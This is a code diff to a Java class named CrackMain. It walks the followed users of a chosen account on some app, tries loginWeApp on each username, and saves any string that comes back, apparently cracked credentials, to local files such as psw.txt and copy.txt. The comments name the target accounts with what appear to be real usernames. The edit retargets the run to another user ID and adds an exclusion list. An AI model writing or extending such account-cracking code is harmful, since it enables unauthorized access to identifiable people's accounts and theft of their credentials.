@@ -13,13 +13,19 @@ import net.lqm.util.ReadFileUtil;
 
 public class CrackMain {
 	public static void main(String[] args) {
+		//排除项
+		List<String> l1 = ReadFileUtil.readTxtFile("D:\\Documents\\we\\psw.txt", false);
+		
 		//61066=michlie;61271=柠檬爸爸;61010=wangjunling3
-		for(String userId : getFavoriteUsers("61010")) {
+		for(String userId : getFavoriteUsers("61066")) {
 			String name = getUserName(userId);
+//			ReadFileUtil.writeTxtFile("D:\\Documents\\we\\my.txt", name);
 			String str = loginWeApp(name);
 			if(str!=null) {
-				System.out.println(str);
-				ReadFileUtil.writeTxtFile("D:\\Documents\\we\\wangjunling.txt", str);
+//				if(!l1.contains(str)){
+					System.out.println(str);
+					ReadFileUtil.writeTxtFile("D:\\Documents\\we\\copy.txt", str);
+//				}
 			}
 		}
 	}
